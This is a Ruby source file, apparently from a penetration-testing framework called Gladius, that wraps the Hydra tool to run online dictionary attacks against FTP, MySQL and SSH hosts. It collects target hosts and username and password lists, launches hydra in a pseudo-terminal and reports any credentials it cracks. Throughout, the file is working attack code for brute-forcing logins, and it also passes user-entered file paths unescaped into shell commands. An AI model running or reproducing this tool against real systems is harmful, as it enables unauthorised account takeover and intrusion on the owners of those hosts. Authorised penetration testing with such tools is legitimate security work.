#!/usr/bin/env ruby

# Author:  p$3ud0R@nD0m
# Version: 0.0.2

require_relative 'tool'
require_relative 'gpty'
require_relative '../menus/dictionaryonline'

class Hydra < Tool
  def initialize(title)
    @title = title
    # Path variables
    @@path = "hydra"
    @@hosts = "/usr/share/gladius/input/stdn_hosts.txt"
    @@stdn_usrs = "/usr/share/gladius/input/stdn_usrs.txt"
    @@stdn_pwds = "/usr/share/gladius/input/stdn_pwds.txt"
    @@ftp_usrs = "/usr/share/gladius/input/hydra_ftp_usrs.txt"
    @@ftp_pwds = "/usr/share/gladius/input/hydra_ftp_pwds.txt"
    @@mysql_usrs = "/usr/share/gladius/input/hydra_mysql_usrs.txt"
    @@mysql_pwds = "/usr/share/gladius/input/hydra_mysql_pwds.txt"
    @@ssh_usrs = "/usr/share/gladius/input/hydra_ssh_usrs.txt"
    @@ssh_pwds = "/usr/share/gladius/input/hydra_ssh_pwds.txt"
    # Variables for timestamping out files and child pid files
    @@time = Time.now
    @@out_file_tstamp = @@time.year.to_s + "-" + @@time.mon.to_s + "-" + @@time.day.to_s + \
                  "_" + @@time.hour.to_s + ":" + @@time.min.to_s + ":" + @@time.sec.to_s
    @@out_file = "/usr/share/gladius/output/hydra_" + @@out_file_tstamp + ".txt"
    @@pid_tstamp = "%10.10f" % @@time.to_f
    @@pid_file = "/usr/share/gladius/tmp/pids/" + @@pid_tstamp
  end

  def header_hydra
    header
    instruct_input_targets
    example("fqdn", "ip")
  end

  def clean_exit
    if File.exists?(@@pid_file)
      pid = File.read(@@pid_file)
      `kill -9 #{pid}`
      File.delete(@@pid_file)
    end
    puts
    DictionaryOnline.new("Online Dictionary Attacks").menu
  rescue Interrupt
    puts
    puts "Exiting Gladius. Have a bloody day!".red
    begin
      Kernel.exit
    rescue Exception => e
    puts
    end
  end
  
  # Rescue mid-attack 
  def resc
    puts
    puts "Dictionary attack stopped due to interrupt.".red
    clean_exit
  end
  
  # Parse and display results
  def results(service)
    puts
    out_file = @@out_file
    rslt = open(@@out_file) { |a| a.grep(/\[#{service}\]/) }
    if rslt.count == 0
      puts "Hydra did not find valid credentials.".light_yellow
    else
      puts "Hydra found the following credentials:".light_yellow
      puts rslt
    end
    puts
    puts "Raw output can be found here:".yellow
    puts out_file
  end

  # Online dictionary attack against ftp
  def ftp
    # Take hosts and count.
    header_hydra
    a = File.open(@@hosts, "w")
    while line = gets
      a << line
    end
    a.close
    hosts = @@hosts
    line_count = `wc -l #{hosts} |awk '{print $1}'`.to_i
    # Host count is zero. Error
    if line_count == 0
      puts "No hosts were input.".red
      ftp
    # Host count is <= 5. Recommend large user/pass combinations.
    elsif line_count == 1
      puts
      puts "Select your tactic:".light_yellow
      puts "Since only 1 host was input, we recommend option 1.".yellow
    elsif line_count <= 5
      line_count = line_count.to_s
      puts "This is linecount " + line_count
      puts "Select your tactic:".light_yellow
      puts "Since only #{line_count} hosts were input, we recommend option 1.".yellow
    # Host count is > 5. Recommend STDN users and passwords.
    else
      line_count = line_count.to_s
      puts
      puts "Since #{line_count} hosts were input, we recommend option 2 or 3.".yellow
    end
    puts "1. 476 attempts/host = 14 users * 34 passwords"
    puts "2. Input your own users and passwords."
    puts "3. Input your own user and password lists."
    sel = gets.to_i
    puts
    # 10,000 attempts/host
    if sel == 1
      x = Gpty.new
      x.time = @@pid_tstamp
      x.cmd = @@path + " -V -t 8 -e ns -L " + @@ftp_usrs + " -P " + @@ftp_pwds + " -M " + @@hosts + " ftp |tee " + @@out_file
      x.shell
      results("ftp")
      clean_exit
    # STDN users and passwords.
    elsif sel == 2
      instruct_input_usrs
      puts "Examples:".yellow
      puts "root".yellow
      puts "ftp".yellow
      puts
      a = File.open(@@stdn_usrs, "w")
      while line = gets
        a << line
      end
      a.close
      stdn_usrs = @@stdn_usrs
      puts
      instruct_input_pswds
      puts "Examples:".yellow
      puts "password".yellow
      puts "abc123".yellow
      puts
      a = File.open(@@stdn_pwds, "w")
      while line = gets
        a << line
      end
      a.close
      x = Gpty.new
      x.time = @@pid_tstamp
      x.cmd = @@path + " -V -t 8 -L " + @@stdn_usrs + " -P " + @@stdn_pwds + " -M " + @@hosts + " ftp |tee " + @@out_file
      x.shell
      results("ftp")
      clean_exit
    # STDN user and password lists.
    elsif sel == 3
      puts "Input your user file and press 'Enter'.".light_yellow
      puts "Example:".yellow
      puts "/root/Desktop/users.txt".yellow
      puts
      usrs_lst = gets.chomp
      puts
      puts "Input your password file and press 'Enter'.".light_yellow
      puts "Example:".yellow
      puts "/root/Desktop/passwords.txt".yellow
      puts
      pwds_lst = gets.chomp
      puts
      x = Gpty.new
      x.time = @@pid_tstamp
      x.cmd = @@path + " -V -t 8 -L #{usrs_lst} -P #{pwds_lst} -M " + @@hosts + " ftp |tee " + @@out_file
      x.shell
      results("ftp")
      clean_exit
    else
      puts "Invalid selection.".red
      ftp
    end
  rescue Interrupt
    resc
  end

  # Online dictionary attack against mysql
  def mysql
    # Take hosts and count.
    header_hydra
    a = File.open(@@hosts, "w")
    while line = gets
      a << line
    end
    a.close
    hosts = @@hosts
    line_count = `wc -l #{hosts} |awk '{print $1}'`.to_i
    # Host count is zero. Error
    if line_count == 0
      puts "No hosts were input.".red
    # Host count is <= 5. Recommend large user/pass combinations.
    elsif line_count == 1
      puts
      puts "Select your tactic:".light_yellow
      puts "Since only #{line_count} host was input, we recommend option 1.".yellow
    elsif line_count <= 5
      puts
      puts "Select your tactic:".light_yellow
      puts "Since only #{line_count} hosts were input, we recommend option 1.".yellow
    # Host count is > 5. Recommend STDN users and passwords.
    else
      puts
      puts "Since #{line_count} hosts were input, we recommend option 1.".yellow
    end
      puts "1. 12 attempts/host = 2 users * 6 passwords"
      puts "2. Input your own users and passwords."
      puts "3. Input your own user and password lists."
      sel = gets.to_i
      puts
      # 14 attempts/host
      if sel == 1
        x = Gpty.new
        x.time = @@pid_tstamp
        x.cmd = @@path + " -V -t 8 -e ns -L " + @@mysql_usrs + " -P " + @@mysql_pwds + " -M " + @@hosts + " mysql |tee " + @@out_file
        x.shell
        results("mysql")
        clean_exit
      # STDN users and passwords.
      elsif sel == 2
        instruct_input_usrs
        puts "Examples:".yellow
        puts "root".yellow
        puts "mysql".yellow
        puts
        a = File.open(@@stdn_usrs, "w")
        while line = gets
          a << line
        end
        a.close
        stdn_usrs = @@stdn_usrs
        puts
        instruct_input_pswds
        puts "Examples:".yellow
        puts "root".yellow
        puts "password".yellow
        puts "mysql".yellow
        puts "admin".yellow
        puts "toor".yellow
        puts "temp".yellow
        puts
        a = File.open(@@stdn_pwds, "w")
        while line = gets
          a << line
        end
        a.close
        x = Gpty.new
        x.time = @@pid_tstamp
        x.cmd = @@path + " -V -t 8 -L " + @@stdn_usrs + " -P " + @@stdn_pwds + " -M " + @@hosts + " mysql |tee " + @@out_file
        x.shell
        results("mysql")
        clean_exit
      # STDN user and password lists.
      elsif sel == 3
        puts "Input your user file and press 'Enter'.".light_yellow
        puts "Example:".yellow
        puts "/root/Desktop/users.txt".yellow
        puts
        usrs_lst = gets.chomp
        puts
        puts "Input your password file and press 'Enter'.".light_yellow
        puts "Example:".yellow
        puts "/root/Desktop/passwords.txt".yellow
        puts
        pwds_lst = gets.chomp
        puts
        x = Gpty.new
        x.time = @@pid_tstamp
        x.cmd = @@path + " -V -t 8 -L #{usrs_lst} -P #{pwds_lst} -M " + @@hosts + " mysql |tee " + @@out_file
        x.shell
        results("mysql")
        clean_exit
      else
        puts "Invalid selection.".red
        mysql
      end
  rescue Interrupt
    resc
  end

  # Online dictionary attack against ssh
  def ssh
    # Take hosts and count.
    header_hydra
    a = File.open(@@hosts, "w")
    while line = gets
      a << line
    end
    a.close
    hosts = @@hosts
    line_count = `wc -l #{hosts} |awk '{print $1}'`.to_i
    # Host count is zero. Error
    if line_count == 0
      puts "No hosts were input.".red
    # Host count is <= 5. Recommend large user/pass combinations.
    elsif line_count == 1
      puts
      puts "Select your tactic:".light_yellow
      puts "Since only #{line_count} host was input, we recommend option 1.".yellow
    elsif line_count <= 5
      puts
      puts "Select your tactic:".light_yellow
      puts "Since only #{line_count} hosts were input, we recommend option 1.".yellow
    # Host count is > 5. Recommend STDN users and passwords.
    else
      puts
      puts "Since #{line_count} hosts were input, we recommend option 2 or 3.".yellow
    end
      puts "1. 10,000 attempts/host = 10 users * 1,000 passwords"
      puts "2. Input your own users and passwords."
      puts "3. Input your own user and password lists."
      sel = gets.to_i
      puts
      # 10,000 attempts/host
      if sel == 1
        x = Gpty.new
        x.time = @@pid_tstamp
        x.cmd = @@path + " -V -t 8 -e ns -L " + @@ssh_usrs + " -P " + @@ssh_pwds + " -M " + @@hosts + " ssh -s 22 |tee " + @@out_file
        x.shell
        results("ssh")
        clean_exit
      # STDN users and passwords.
      elsif sel == 2
        instruct_input_usrs
        puts "Example:".yellow
        puts "root".yellow
        puts
        a = File.open(@@stdn_usrs, "w")
        while line = gets
          a << line
        end
        a.close
        stdn_usrs = @@stdn_usrs
        puts
        instruct_input_pswds
        puts "Examples:".yellow
        puts "root".yellow
        puts "password".yellow
        puts
        a = File.open(@@stdn_pwds, "w")
        while line = gets
          a << line
        end
        a.close
        x = Gpty.new
        x.time = @@pid_tstamp
        x.cmd = @@path + " -V -t 8 -L " + @@stdn_usrs + " -P " + @@stdn_pwds + " -M " + @@hosts + " ssh |tee " + @@out_file
        x.shell
        results("ssh")
        clean_exit
      # STDN user and password lists.
      elsif sel == 3
        puts "Input your user file and press 'Enter'.".light_yellow
        puts "Example:".yellow
        puts "/root/Desktop/users.txt".yellow
        puts
        usrs_lst = gets.chomp
        puts
        puts "Input your password file and press 'Enter'.".light_yellow
        puts "Example:".yellow
        puts "/root/Desktop/passwords.txt".yellow
        puts
        pwds_lst = gets.chomp
        puts
        x = Gpty.new
        x.time = @@pid_tstamp
        x.cmd = @@path + " -V -t 8 -L #{usrs_lst} -P #{pwds_lst} -M " + @@hosts + " ssh |tee " + @@out_file
        x.shell
        results("ssh")
        clean_exit
      else
        puts "Invalid selection.".red
        ssh
      end
  rescue Interrupt
    resc
  end
end  
